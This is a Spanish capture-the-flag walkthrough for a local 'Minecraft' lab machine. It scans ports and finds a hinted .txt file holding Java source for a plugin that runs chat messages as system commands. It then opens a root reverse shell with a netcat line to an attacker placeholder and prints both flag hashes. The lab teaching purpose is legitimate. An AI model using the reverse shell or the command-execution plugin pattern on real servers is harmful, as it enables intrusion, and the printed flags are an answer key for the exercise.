---
icon: flag
---

# CTF Minecraft Intermediate

URL Download CTF = [https://drive.google.com/file/d/1-h9Qw6N\_2SGy50rs4ia3YfX8tvZU9x3l/view?usp=sharing](https://drive.google.com/file/d/1-h9Qw6N_2SGy50rs4ia3YfX8tvZU9x3l/view?usp=sharing)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip minecraft.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh minecraft.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 04:23 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000037s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: HTTrack Website Copier/3.x
|_http-title: Local index - HTTrack Website Copier
|_http-server-header: Apache/2.4.58 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
MAC Address: 02:42:AC:11:00:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
```

Veremos varias cosas interesantes, entre ellas que hay un `Minecraft` corriendo en el servidor, pero antes de entrar a el, vamos a explorar la pagina web que esta alojada en el puerto `80`, si entramos dentro de ella veremos una pagina web de `Minecraft` como un duplicado de la original en el que se puede realizar la compra del juego, etc... Pero eso no nos interesa, si inspeccionamos el codigo veremos lo siguiente en las ultimas lineas de codigo:

```html
<!-- AutoExecPlugin.txt --> 
```

Veremos lo que parece ser un archivo `.txt` el cual vamos a probar si estuviera subido en el servidor.

```
URL = http://<IP>/AutoExecPlugin.txt
```

Info:

```java
package me.vuln.autoexec;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class AutoExecPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("AutoExecPlugin habilitado");
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String msg = event.getMessage();
        Player player = event.getPlayer();

        // Detecta comando con prefijo !exec
        if (msg.startsWith("!exec ")) {
            event.setCancelled(true); // CANCELA que se muestre el mensaje en el chat

            String command = msg.substring(6); // Quitar "!exec " del mensaje

            try {
                // Ejecutar comando en la consola del servidor
                Process proc = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                StringBuilder output = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                proc.waitFor();

                // Enviar salida del comando al jugador que ejecutÃ³ el chat
                player.sendMessage("Â§c[Output]:\n" + output.toString());

            } catch (Exception e) {
                player.sendMessage("Â§4Error ejecutando comando: " + e.getMessage());
            }
        }
    }
}
```

Por lo que vemos si existe, esto es una clase de `JAVA` la cual nos esta dando una pista de que si esto estuviera en el servidor de `minecraft` como un `plugin` puede ser muy vulnerable ya que puede ejecutar comandos del sistema dentro del propio servidor del juego, por lo que vamos a descargarnos `minecraft` para meternos en dicho servidor.

## Instalación Minecraft (Gratis)

Vamos a ir al siguiente enlace en la pagina del `TLauncher` de `Minecraft`, es para jugar `Minecraft` gratis.

URL = [Download Minecraft TLauncher](https://tlauncher.org/)

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-18 104411.png" alt=""><figcaption></figcaption></figure>

Le daremos a `TLauncher for Linux` para que nos lo descargue, esto nos descargara un `.zip` el cual vamos a extraer de esta forma.

```shell
cd /home/<USERNAME>/Download
unzip <FILE>.zip
```

Una vez extraido veremos lo siguiente en la carpeta llamada `TLauncher.v16`:

```shell
cd TLauncher.v16/
ls -la
```

Info:

```
total 9904
drwxrwxr-x 2 kali kali     4096 Jun 17 12:50 .
drwxr-xr-x 3 kali kali     4096 Jun 17 16:54 ..
-rw-rw-r-- 1 kali kali     2198 Dec 10  2024 README-EN.txt
-rw-rw-r-- 1 kali kali     3235 Dec 10  2024 README-RUS.txt
-rw-rw-r-- 1 kali kali 10121689 May  4 06:37 TLauncher.jar
```

Lo importante es el archivo `TLauncher.jar` que es el que inicia `Minecraft` por lo que tendremos que ejecutarlo de esta forma.

```shell
java -jar tlauncher.jar
```

Esto instalara `Minecraft` y abrira el launcher para iniciarlo, dentro del mismo tendremos que elegir el nombre de usuario que puede ser cualquiera y muy importante la version, en el reporte de `nmap` vimos que la version es `Minecraft 1.12.2` por lo que tendremos que elegir la llamada `release 1.12.2` y darle a `Install`.

Eso instalara todo lo necesario para jugarla, una vez que se haya instalado todo nos pondra `Enter the game` le daremos y despues de un rato estaremos dentro del menu de `Minecraft`, nos iremos a la opcion llamada `Multiplayer` y dentro del mismo configuraremos el servidor de `Miencraft` desde donde esta corriendo la maquina victima.

Le daremos al boton llamado `Add Server` y dentro del mismo veremos el `Server Name` y el `Server Address` el que nos interesa es configurar el `Server Adderess` por lo que tendremos que poner la `IP` de la maquina victima junto con el puerto que es el `25565` quedando de esta forma:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-18 104419.png" alt=""><figcaption></figcaption></figure>

Le daremos a `Done` y si refrescamos tendremos que ver el server activo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-18 104427.png" alt=""><figcaption></figcaption></figure>

Ahora seleccionaremos el servidor y le daremos al boton llamado `Join Server` esto nos metera dentro del mundo de `Minecraft` del servidor.

## Escalate Privileges

Una vez dentro del mundo vamos a probar a listar los `plugins` de esta forma desde `Minecraft`.

```shell
/pl
```

Info:

```
Plugins (2): AutoOpPlugin, AutoExecPlugin
```

Vemos que esta el `plugin` que encontramos del `.txt` por lo que vamos a probar a ejecutar lo que mencionaba en el `.txt` para poder ejecutar comandos con `!exec` acompañado de un comando del sistema.

```shell
!exec whoami
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-18 104434.png" alt=""><figcaption></figcaption></figure>

Vemos que se esta ejecutando de forma correcta podremos realizar un `RCE`, por lo que vamos a probar a generarnos una `reverse shell` de esta forma.

```shell
!exec nc <IP_ATTACKER> <PORT> -e /bin/sh
```

Antes de ejecutarlo tendremos que ponernos a la escucha desde nuestra maquina `host`.

```shell
nc -lvnp <IP>
```

Estando a la escucha si ejecutamos el comando anterior desde `Minecraft` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 47064
whoami
root
```

Vemos que hemos obtenido de forma exitosa una `shell` desde la maquina victima mediante un `plugin` vulnerable desde `Minecraft`, sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez echo esto leeremos la `flag` del usuario y de `root`.

> user.txt

```
8725a65493f812597167d64cf85640e6
```

> root.txt

```
ebcc53fe4fcaffea2fe32390021783c4
```
